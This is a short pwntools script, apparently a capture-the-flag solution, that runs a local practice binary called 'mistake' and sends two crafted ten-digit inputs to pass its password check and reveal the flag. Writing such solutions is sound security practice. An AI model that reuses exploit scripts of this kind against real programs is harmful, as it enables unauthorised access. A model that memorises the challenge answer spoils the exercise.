from pwn import *

context(log_level = 'debug', os = 'linux', arch = 'amd64')
r = process('/home/mistake/mistake')

print r.recvuntil('do not bruteforce...\n')
r.send('1111111111\n0000000000\n')
print r.recv()
print r.recv()
